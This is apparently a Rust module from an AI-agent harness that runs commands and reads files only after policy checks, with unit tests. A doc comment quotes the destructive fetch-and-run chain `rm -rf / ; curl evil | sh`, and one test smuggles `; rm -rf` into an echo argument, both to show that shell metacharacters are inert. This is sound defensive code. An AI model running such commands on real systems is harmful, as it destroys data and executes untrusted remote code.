//! Running commands and reading the filesystem, with policy checks.
//!
//! Every function here consults [`AccessManager`] before it touches anything.
//! A command is split into an argv and handed to the OS directly — there is no
//! shell, so `rm -rf / ; curl evil | sh` is one program named `rm` with a
//! nonsensical argument list rather than three commands, and the policy sees
//! the whole string it was asked about.

use std::io::Read;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::access::AccessManager;
use crate::error::{Error, Result};

/// The default wall-clock ceiling on one command.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(60);

/// How often a running child is checked against its deadline.
///
/// Short enough that a timeout is not visibly late, long enough that a
/// long-running command does not spend the session's CPU on polling.
const POLL_INTERVAL: Duration = Duration::from_millis(5);

/// Run *command* and return its stdout.
///
/// A non-zero exit is an error carrying stderr, because a model that is handed
/// empty output and told nothing went wrong will report success.
pub fn run_command(
    access: &AccessManager,
    command: &str,
    cwd: Option<&Path>,
    timeout: Option<Duration>,
    actor: &str,
) -> Result<String> {
    let argv = shell_words::split(command)
        .map_err(|err| Error::session(format!("Invalid command syntax: {err}")))?;
    let program = argv.first().map(String::as_str).unwrap_or("");
    access.check_command(command, program, actor)?;

    let mut builder = Command::new(program);
    builder
        .args(&argv[1..])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if let Some(cwd) = cwd {
        builder.current_dir(cwd);
    }

    let mut child = builder
        .spawn()
        .map_err(|err| Error::session(format!("Command failed: {command}: {err}")))?;

    // Drained on their own threads: a child that fills a pipe buffer blocks
    // until someone reads it, and a parent waiting on exit before reading would
    // wait forever for a command that produced more output than the buffer.
    let mut stdout = child.stdout.take().expect("stdout was piped");
    let mut stderr = child.stderr.take().expect("stderr was piped");
    let out_reader = std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = stdout.read_to_end(&mut buffer);
        buffer
    });
    let err_reader = std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = stderr.read_to_end(&mut buffer);
        buffer
    });

    let deadline = timeout.map(|timeout| Instant::now() + timeout);
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) => {}
            Err(err) => {
                return Err(Error::session(format!("Command failed: {command}: {err}")));
            }
        }
        if deadline.is_some_and(|deadline| Instant::now() >= deadline) {
            let _ = child.kill();
            let _ = child.wait();
            let _ = out_reader.join();
            let _ = err_reader.join();
            return Err(Error::session(format!("Command timed out: {command}")));
        }
        std::thread::sleep(POLL_INTERVAL);
    };

    let stdout = decode(out_reader.join().unwrap_or_default());
    let stderr = decode(err_reader.join().unwrap_or_default());

    if !status.success() {
        let code = status.code().unwrap_or(-1);
        let mut message = format!("Command failed (exit {code}): {command}");
        let trailer = stderr.trim();
        if !trailer.is_empty() {
            message.push('\n');
            message.push_str(trailer);
        }
        return Err(Error::session(message));
    }
    Ok(stdout)
}

/// Read a file the policy permits.
pub fn read_file(access: &AccessManager, path: &str, actor: &str) -> Result<String> {
    let resolved = access.check_path("read", path, actor)?;
    std::fs::read_to_string(&resolved)
        .map_err(|err| Error::Io(format!("{}: {err}", resolved.display())))
}

/// List a directory the policy permits, sorted by name.
pub fn list_dir(access: &AccessManager, path: &str, actor: &str) -> Result<Vec<String>> {
    let resolved = access.check_path("list", path, actor)?;
    if !resolved.is_dir() {
        return Err(Error::session(format!(
            "Not a directory: {}",
            resolved.display()
        )));
    }
    let entries = std::fs::read_dir(&resolved)
        .map_err(|err| Error::Io(format!("{}: {err}", resolved.display())))?;
    let mut names: Vec<String> = entries
        .filter_map(|entry| Some(entry.ok()?.file_name().to_string_lossy().into_owned()))
        .collect();
    names.sort();
    Ok(names)
}

/// Child output as text, the way `subprocess.run(text=True)` would decode it.
fn decode(bytes: Vec<u8>) -> String {
    String::from_utf8_lossy(&bytes).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::access::AccessPolicy;
    use std::path::PathBuf;

    fn allowing(configure: impl FnOnce(&mut AccessPolicy)) -> AccessManager {
        let mut policy = AccessPolicy::new();
        configure(&mut policy);
        AccessManager::new(policy)
    }

    struct TempDir(PathBuf);

    impl TempDir {
        fn new(tag: &str) -> Self {
            let path = std::env::temp_dir().join(format!("kerness-exec-{tag}"));
            let _ = std::fs::remove_dir_all(&path);
            std::fs::create_dir_all(&path).expect("create temp dir");
            TempDir(std::fs::canonicalize(&path).expect("canonicalize"))
        }

        fn text(&self) -> String {
            self.0.display().to_string()
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn an_allowed_command_returns_its_stdout() {
        let access = allowing(|policy| policy.allowed_programs = vec!["echo".into()]);
        let out = run_command(&access, "echo hello", None, None, "").expect("runs");
        assert_eq!(out, "hello\n");
    }

    #[test]
    fn the_policy_is_consulted_before_anything_is_spawned() {
        let error = run_command(&AccessManager::default(), "echo hi", None, None, "")
            .expect_err("default denies");
        assert!(matches!(error, Error::AccessDenied(_)), "{error:?}");
    }

    #[test]
    fn a_failing_command_reports_its_code_and_stderr() {
        let access = allowing(|policy| policy.allowed_programs = vec!["sh".into()]);
        let error = run_command(&access, "sh -c 'echo boom >&2; exit 3'", None, None, "")
            .expect_err("exit 3");
        let message = error.to_string();
        assert!(message.contains("(exit 3)"), "{message}");
        assert!(message.contains("boom"), "{message}");
    }

    #[test]
    fn there_is_no_shell_so_metacharacters_are_arguments() {
        // `echo hi; rm -rf /` is one program named `echo` with `;` and `rm` as
        // arguments — the semicolon never separates anything.
        let access = allowing(|policy| policy.allowed_programs = vec!["echo".into()]);
        let out = run_command(&access, "echo hi ; rm -rf /tmp/nope", None, None, "").expect("runs");
        assert_eq!(out, "hi ; rm -rf /tmp/nope\n");
    }

    #[test]
    fn unbalanced_quoting_is_refused_before_the_policy_check() {
        let access = allowing(|policy| policy.allowed_command_patterns = vec!["*".into()]);
        let error = run_command(&access, "echo 'unclosed", None, None, "").expect_err("bad syntax");
        assert!(
            error.to_string().contains("Invalid command syntax"),
            "{error}"
        );
    }

    #[test]
    fn a_command_that_overruns_its_deadline_is_killed() {
        let access = allowing(|policy| policy.allowed_programs = vec!["sleep".into()]);
        let error = run_command(
            &access,
            "sleep 30",
            None,
            Some(Duration::from_millis(100)),
            "",
        )
        .expect_err("timed out");
        assert!(error.to_string().contains("Command timed out"), "{error}");
    }

    #[test]
    fn output_larger_than_a_pipe_buffer_still_completes() {
        // The reader threads exist for this: a child filling its pipe blocks
        // until someone drains it, and a parent that waited for exit first
        // would deadlock.
        let access = allowing(|policy| policy.allowed_programs = vec!["sh".into()]);
        let out = run_command(
            &access,
            "sh -c 'yes abcdefgh | head -n 100000'",
            None,
            Some(Duration::from_secs(30)),
            "",
        )
        .expect("runs");
        assert_eq!(out.lines().count(), 100_000);
    }

    #[test]
    fn cwd_is_where_the_command_runs() {
        let dir = TempDir::new("cwd");
        let access = allowing(|policy| policy.allowed_programs = vec!["pwd".into()]);
        let out = run_command(&access, "pwd", Some(&dir.0), None, "").expect("runs");
        assert_eq!(out.trim(), dir.text());
    }

    #[test]
    fn reads_and_listings_go_through_the_policy() {
        let dir = TempDir::new("fs");
        std::fs::write(dir.0.join("b.txt"), "contents").expect("write");
        std::fs::write(dir.0.join("a.txt"), "other").expect("write");

        let denied = AccessManager::default();
        assert!(read_file(&denied, &dir.0.join("b.txt").display().to_string(), "").is_err());
        assert!(list_dir(&denied, &dir.text(), "").is_err());

        let access = allowing(|policy| policy.allowed_dirs = vec![dir.text()]);
        assert_eq!(
            read_file(&access, &dir.0.join("b.txt").display().to_string(), "").expect("read"),
            "contents"
        );
        assert_eq!(
            list_dir(&access, &dir.text(), "").expect("list"),
            vec!["a.txt", "b.txt"],
            "entries come back sorted"
        );
    }

    #[test]
    fn listing_a_file_says_so_rather_than_returning_nothing() {
        let dir = TempDir::new("notadir");
        let file = dir.0.join("a.txt");
        std::fs::write(&file, "x").expect("write");
        let access = allowing(|policy| policy.allowed_dirs = vec![dir.text()]);

        let error =
            list_dir(&access, &file.display().to_string(), "").expect_err("not a directory");
        assert!(
            error.to_string().starts_with("Not a directory: "),
            "{error}"
        );
    }
}
